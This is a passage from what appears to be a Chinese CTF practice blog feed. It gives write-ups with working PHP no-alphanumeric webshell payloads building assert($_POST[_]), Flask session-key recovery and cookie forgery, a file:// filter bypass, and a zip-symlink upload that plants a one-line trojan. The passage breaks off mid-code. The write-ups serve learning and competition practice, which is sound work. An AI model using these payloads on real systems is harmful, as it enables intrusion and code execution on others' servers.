class="variable">$$__</span>;<span class="comment">#$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);<span class="comment">#assert($_POST[_]);</span></span><br><span class="line"><span class="comment">//拼接起来</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>;<span class="variable">$__</span> = <span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>;<span class="variable">$___</span> = <span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line"><span class="comment">//最终需要url编码</span></span><br><span class="line">?code=%<span class="number">24</span>_%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>!((%<span class="number">25</span>)(%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">40</span>%<span class="number">5</span>B%<span class="number">5</span>B%<span class="number">40</span>%<span class="number">5</span>B%<span class="number">5</span>C%<span class="number">5</span>C%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>!%<span class="number">2</span>B%<span class="number">2</span>F((%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>~%<span class="number">7</span>B%<span class="number">60</span>%<span class="number">7</span>B%<span class="number">7</span>C%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>_(%<span class="number">24</span>___%<span class="number">5</span>B_%<span class="number">5</span>D)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure><br>比较奇怪的是这个逃逸无法执行命令system(‘ls’);只能执行phpinfo();flag在phpinfo里<br>下面是第二中构造方法是一个一个字符构造再拼接<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure></p>
<h2 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h2><p>这题因为其版本为5.多的原因不能和上题7.多用一样直接构造,要预先先传到变量里再构造成函数<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造phpinfo()</span><br><span class="line">?code=$_(~%8F%97%8F%96%91%99%90);$_();</span><br></pre></td></tr></table></figure><br>不知道为什么我的hackbar不能传只能使用bp来传值。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造逃逸</span><br><span class="line">同样构造assert($_POST[_]);</span><br><span class="line">过程和上面的相似就是构造字符的方法变成了取反</span><br><span class="line">$_=(~%9E%8C%8C%9A%8D%8B);#$_=assert;</span><br><span class="line">$__=(~%A0%AF%B0%AC%AB);#$__=_POST;</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]);</span><br><span class="line">-------------------------------------------------</span><br><span class="line">$_=(~%9E%8C%8C%9A%8D%8B);$__=(~%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);&amp;_=phpinfo()</span><br></pre></td></tr></table></figure></p>
<h2 id="自增绕过"><a href="#自增绕过" class="headerlink" title="自增绕过"></a>自增绕过</h2><p>这里直接上p神文章<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">无字母数字绕过</a><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>++;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>这里输出值为B也就是说我们可以通过对字符的自增来获取其他字符<br>即我们得到A就可以通过这个方法得到A-Z和a-z.<br>那么我们应该怎么得到A呢?<br>p牛文章有指出当我们强制将字符串和数组拼接在以前时数组会变成Array.<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> [].<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">---------------------------输出</span><br><span class="line">Array</span><br><span class="line">Array</span><br></pre></td></tr></table></figure><br>发现只要我们将空字符和数组拼接就能得到Array,即使只有[]和’’也可以<br>在强制将数组转化为字符串也会变成Array.即<code>$_=[];$_=&quot;$_&quot;``$_===Array</code>.<br>在经过精细的构造就会变成如下payload<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure><br>这就能构造出<code>ASSERT($_POST[_]);</code></p>
<h1 id="CISCN-2019华东南-Web4"><a href="#CISCN-2019华东南-Web4" class="headerlink" title="[CISCN 2019华东南]Web4"></a>[CISCN 2019华东南]Web4</h1><p>这题我们打开，他会让我们点击什么。发现有url参数。一开始我以为是ssrf。扫了一下目录发现没有扫到什么。只扫到console。这时候就应该想到目录穿越才对的。但是我没进行尝试，就直接看来wp，发现是目录穿越。于是就用<code>/proc/self/cmdline</code>查看了一下进程其源码。<br><code>/usr/local/bin/python/app/app.py</code>我们查看源码<br> <br> <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"> <span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>我们可以看到其存在flag.txt.只要我们的session的username为fuck，就可以读取/flag。这里就可以进行session伪造了。我们来找一下key<br>会发现这段代码<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br></pre></td></tr></table></figure><br>这也算新知识了记下来。其random.seed为设置随机数种子，伪随机设置了种子每个种子生成的随机数相同。getnode()函数获得mac网卡地址。得到的是16进制数组即没有:。<br>那么我们就可以使用/sys/class/net/eth0/address来得到mac地址。<br>注意题目的python版本为2.7.16<br><br>所以我们要使用网上的在线编译器来编译这个代码<br><img src="image-1.png" alt="alt text"><br>得到key为60.455500014<br><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s &quot;60.455500014&quot; -c &quot;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Zfw0fg.C03PLKYSlBxllEx1QOk4057mB4U&quot;</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------</span><br><span class="line">python flask_session_cookie_manager3.py encode -s &quot;60.455500014&quot; -t &quot;&#123;&#x27;username&#x27;:b&#x27;fuck&#x27;&#125;&quot;</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.Zfw2uA.DJbCXsbUay8NpJFBUkEbIBaQxSE</span><br></pre></td></tr></table></figure><br><br>得到flag，一开始我以为是计算PIN来进行rce的但是这么也算不出来。可以这个方法可以但是我找不到脚本，悲</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>刷题</category>
        <category>NSS</category>
      </categories>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>NSS刷题2。</title>
    <url>/2024/03/31/NSS%E5%88%B7%E9%A2%982/</url>
    <content><![CDATA[<h1 id="哈哈哈哈水水博客写一写刷题学到的一些知识点"><a href="#哈哈哈哈水水博客写一写刷题学到的一些知识点" class="headerlink" title="哈哈哈哈水水博客写一写刷题学到的一些知识点"></a>哈哈哈哈水水博客写一写刷题学到的一些知识点</h1><h1 id="HDCTF-2023-YamiYami"><a href="#HDCTF-2023-YamiYami" class="headerlink" title="[HDCTF 2023]YamiYami"></a>[HDCTF 2023]YamiYami</h1><p>这道题目的前提知识点有点一点小多，也学到了不少知识</p>
<h2 id="urlopen函数"><a href="#urlopen函数" class="headerlink" title="urlopen函数"></a>urlopen函数</h2><p>该函数的作用是打开一个url并进行重定向如下。<br><br>我们可以看到网页并没有跳转但是成功查看到了百度的网页。<br>而这个函数结合file伪协议是可以对系统的文件进行读取。如下<br><br>我们可以看到其成功访问并且urlopen是可以解析url的地址的即<code>file://</code>后的地址可以转为url编码的形式。第一个<code>/</code>表示根目录不能url编码其他都可以。<br>即我们可以将我们输入的文件地址转为url编码如<br><code>/etc/passwd</code>可以转为<code>/%65%74%63%2f%70%61%73%73%77%64</code>那么我们就可以采取这种方法对waf进行绕过。</p>
<h2 id="PyYaml反序列化"><a href="#PyYaml反序列化" class="headerlink" title="PyYaml反序列化"></a>PyYaml反序列化</h2>]]></content>
      <categories>
        <category>wp</category>
        <category>刷题</category>
        <category>NSS</category>
      </categories>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>NSS刷题</title>
    <url>/2024/04/16/NSS%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[<h1 id="因为XY整体持续时间太长了，而且后面出的题目也越来越不做人。于是我就想着还是刷刷NSS学习学习吧。"><a href="#因为XY整体持续时间太长了，而且后面出的题目也越来越不做人。于是我就想着还是刷刷NSS学习学习吧。" class="headerlink" title="因为XY整体持续时间太长了，而且后面出的题目也越来越不做人。于是我就想着还是刷刷NSS学习学习吧。"></a>因为XY整体持续时间太长了，而且后面出的题目也越来越不做人。于是我就想着还是刷刷NSS学习学习吧。</h1><h1 id="Unzip-ciscn"><a href="#Unzip-ciscn" class="headerlink" title="Unzip(ciscn)"></a>Unzip(ciscn)</h1><p>这道题目的主要学到的是关于软连接的知识。<br>我先贴几篇文章<br><a href="https://www.cnblogs.com/crazylqy/p/5821105.html">https://www.cnblogs.com/crazylqy/p/5821105.html</a><br><a href="https://www.cnblogs.com/sueyyyy/p/10985443.html">https://www.cnblogs.com/sueyyyy/p/10985443.html</a><br>这篇文章讲的是软链接</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="软连接的概念"><a href="#软连接的概念" class="headerlink" title="软连接的概念"></a>软连接的概念</h3><p>软链接其实就是相当于windows的快捷方式<br>而快捷方式其实就是一个指向对应路径或文件的一种文件，也就是说即使快捷方式在不同的电脑上只要路径存在其就会指向那个路径，软链接同理</p>
<h3 id="软链接创造指令"><a href="#软链接创造指令" class="headerlink" title="软链接创造指令"></a>软链接创造指令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">软链接</span><br><span class="line">ln -s source target</span><br><span class="line">硬链接</span><br><span class="line">ln source target</span><br></pre></td></tr></table></figure>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>看道这题是文件上传那么我们可以很自然的想到上传一个一句话木马文件。但是我们通过扫后台看到的源码，可以看到其文件上传的位置在/tmp目录下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//only this!</span></span><br></pre></td></tr></table></figure><br>我们可以看到其在/tmp目录在解压了我们上传的压缩包。并且其可以进行文件覆盖，那么我们就可以尝试使用软链接<br>我们先创造一个指向/var/www/html文件夹的软链接。<br><br>再通过下面的指令将软链接进行压缩<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip --symlinks test.zip ./test</span><br></pre></td></tr></table></figure><br>然后上传我们的软链接压缩包。<br>这时候/tmp下就会存再一个指向web目录的一个软链接。<br>那么我们要怎么传马呢?<br>很简单我们只要上传一个和软链接文件夹同名的文件夹即可。当进行文件覆盖时会通过软链接将文件夹内的文件覆盖到软链接所指向的文件夹。<br>那么我们创建一个test文件夹在文件夹下写入一个一句话木马。压缩后上传这样shell文件就上传到了web页面下。<br></p>
<h2 id="软链接的其他小技巧"><a href="#软链接的其他小技巧" class="headerlink" title="软链接的其他小技巧"></a>软链接的其他小技巧</h2><p>如果一个网页可以将上传的文件的内容进行输出，那么这时候我们就可以使用软链接尝试指向一些命令和文件尝试进行命令穿越。</p>
<h1 id="CISCN-2023-初赛-go-session"><a href="#CISCN-2023-初赛-go-session" class="headerlink" title="[CISCN 2023 初赛]go_session"></a>[CISCN 2023 初赛]go_session</h1><p>哈哈这篇文章可是让我狠狠的学习了一下go语言的ssti。<br>我们先对源码进行审计<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;html&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">		err = session.Save(c.Request, c.Writer)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">	xssWaf := html.EscapeString(name)</span><br><span class="line">	tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">	body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>main<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;main/route&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">	r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">	r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">	r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们先看mian文件会发现其几个路由。我们查看route的源码<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> store = 